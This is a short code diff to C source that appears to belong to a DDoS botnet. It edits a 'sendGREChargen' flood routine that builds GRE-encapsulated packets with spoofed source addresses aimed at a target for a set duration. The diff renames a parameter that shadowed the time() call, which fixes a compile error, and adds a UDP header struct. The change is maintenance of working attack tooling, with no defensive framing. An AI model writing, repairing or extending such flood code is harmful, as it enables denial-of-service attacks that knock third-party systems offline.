@@ -697,8 +697,14 @@ int sclose(int fd)
         close(fd);
         return 0;
 }
+struct udphdr {
+    uint16_t source;
+    uint16_t dest;
+    uint16_t len;
+    uint16_t check;
+};
 
-void sendGREChargen(unsigned char *target, int port, int time, int spoofed, int packetsize, int pollinterval) {
+void sendGREChargen(unsigned char *target, int port, int duration, int spoofed, int packetsize, int pollinterval) {
     struct sockaddr_in sin;
     sin.sin_family = AF_INET;
     sin.sin_port = htons(port);
@@ -726,7 +732,7 @@ void sendGREChargen(unsigned char *target, int port, int time, int spoofed, int 
     in_addr_t netmask = (spoofed == 0) ? ~((in_addr_t)0) : ~( (1 << (32 - spoofed)) - 1 );
 
     int pollRegister = pollinterval;
-    int end = time(NULL) + time;
+    int end = time(NULL) + duration;
     unsigned int i = 0;
 
     unsigned char packet[sizeof(struct iphdr) + sizeof(struct grehdr) + sizeof(struct iphdr) + sizeof(struct udphdr) + packetsize];
